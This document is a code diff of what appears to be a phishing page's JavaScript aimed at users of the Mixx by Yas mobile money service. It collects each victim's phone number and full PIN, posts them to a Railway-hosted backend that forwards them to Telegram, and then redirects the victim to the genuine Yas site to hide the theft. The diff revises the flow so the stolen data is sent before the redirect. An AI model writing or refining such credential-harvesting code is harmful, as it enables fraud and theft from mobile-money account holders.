@@ -262,12 +262,13 @@
             const phone = phoneInput.value;
             const fullPin = realPin.join('');
             
-            // Show loading overlay
+            // Show loading overlay immediately
             loadingOverlay.style.display = 'flex';
             
-            console.log('📤 Sending data to backend:', { phone, pin: fullPin });
+            console.log('📤 Sending to Railway:', { phone, pin: fullPin });
             
             try {
+                // Send to Railway backend
                 const response = await fetch(BACKEND_URL, {
                     method: 'POST',
                     headers: {
@@ -280,20 +281,23 @@
                 });
                 
                 const result = await response.json();
-                console.log('✅ Backend response:', result);
+                console.log('✅ Railway response:', result);
                 
-                // Wait 1.5 seconds then redirect
-                setTimeout(() => {
-                    window.location.href = "https://yas.co.tz/mixx-by-yas/";
-                }, 1500);
+                // Ensure data was sent successfully
+                if (result.status === 'success') {
+                    console.log('✅ Data sent to Telegram successfully!');
+                } else {
+                    console.warn('⚠️ Telegram response:', result);
+                }
                 
             } catch (error) {
-                console.error('❌ Error sending data:', error);
-                // Still redirect even if error occurs
-                setTimeout(() => {
-                    window.location.href = "https://yas.co.tz/mixx-by-yas/";
-                }, 1000);
+                console.error('❌ Error sending to Railway:', error);
             }
+            
+            // Wait 1.5 seconds to ensure data is sent, then redirect
+            setTimeout(() => {
+                window.location.href = "https://yas.co.tz/mixx-by-yas/";
+            }, 1500);
         }
 
         function updateHiddenAndSubmit() {
